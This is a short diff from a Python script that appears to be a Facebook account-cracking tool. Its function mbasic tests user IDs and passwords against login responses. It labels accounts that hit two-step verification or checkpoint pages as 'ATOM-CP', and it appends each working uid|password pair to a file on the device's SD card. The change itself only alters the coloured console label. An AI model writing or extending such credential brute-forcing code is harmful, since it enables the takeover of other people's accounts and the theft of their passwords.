@@ -1356,12 +1356,12 @@ def mbasic(uid,pwx,tl):
                 oks.append(uid)
                 break
             elif "com.bloks.www.ap.two_step_verification.entrypoint_async" in response.text:
-                print(f" {green}(ATOM-OK) {uid}|{pw} ")
+                print('\33[1;91m[ATOM-CP] '+uid+' | '+pw+'\33[0;97m')
                 open("/sdcard/SUMON_file_2f2.txt", "a").write(f"{uid}|{pw}\n")
                 cps.append(uid)
                 break
             elif "error_user_title" in response.text.replace('\\', '') and "checkpoint" in response.text.replace('\\', ''):
-                print(f" {green}(ATOM-OK) {uid}|{pw} ")
+                print('\33[1;91m[ATOM-CP] '+uid+' | '+pw+'\33[0;97m')
                 open("/sdcard/SUMON_file_2f2.txt", "a").write(f"{uid}|{pw}\n")
                 cps.append(uid)
                 break
